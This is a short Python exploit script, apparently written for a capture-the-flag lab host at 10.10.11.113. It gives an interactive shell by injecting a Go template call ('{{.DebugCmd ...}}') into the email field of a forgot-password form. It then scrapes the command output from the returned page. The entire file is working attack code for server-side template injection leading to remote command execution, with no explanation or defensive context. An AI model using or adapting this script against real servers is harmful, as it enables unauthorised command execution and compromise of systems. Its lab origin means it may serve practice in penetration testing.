import requests
import re

class GoBox():
    def __init__(self,url):
        self.url = url
        self.shell()

    def shell(self):
        while True:
            try:
                debug = '{{.DebugCmd "'
                command = input("$GO> ")
                debug_cmd = debug + command + '"}}'
                data = {
                    "email":debug_cmd
                }
                req_site = requests.post(self.url,data=data)
                search = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)
                output_text = search.search(req_site.text).group(1)
                print(output_text + "\n")
            except KeyboardInterrupt:
                print("\nBye Bye!")
                exit()

if __name__ == "__main__":
     url = 'http://10.10.11.113:8080/forgot/'
     GoBox(url)